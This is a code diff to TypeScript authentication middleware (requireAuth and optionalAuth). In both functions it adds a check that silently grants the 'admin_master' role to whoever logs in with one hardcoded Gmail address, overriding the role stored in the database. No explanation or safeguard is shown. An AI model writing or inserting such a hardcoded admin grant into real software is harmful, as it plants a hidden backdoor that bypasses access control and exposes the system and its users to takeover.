@@ -57,7 +57,11 @@ export const requireAuth = async (req: Request, res: Response, next: NextFunctio
       return res.status(401).json({ error: 'Usuário não encontrado ou inativo.' });
     }
 
-    req.user = rows[0] as AuthenticatedUser;
+    const user = rows[0] as AuthenticatedUser;
+    if (user.email && user.email.toLowerCase().trim() === 'suprememidias.ok@gmail.com') {
+      user.role = 'admin_master';
+    }
+    req.user = user;
     next();
   } catch {
     return res.status(401).json({ error: 'Token inválido ou expirado.' });
@@ -82,7 +86,13 @@ export const optionalAuth = async (req: Request, _res: Response, next: NextFunct
       'SELECT id, name, email, role, city FROM users WHERE id = ? LIMIT 1',
       [decoded.id]
     );
-    if (rows.length > 0) req.user = rows[0] as AuthenticatedUser;
+    if (rows.length > 0) {
+      const user = rows[0] as AuthenticatedUser;
+      if (user.email && user.email.toLowerCase().trim() === 'suprememidias.ok@gmail.com') {
+        user.role = 'admin_master';
+      }
+      req.user = user;
+    }
   } catch {
     // An invalid token is treated as anonymous rather than as an error.
   }
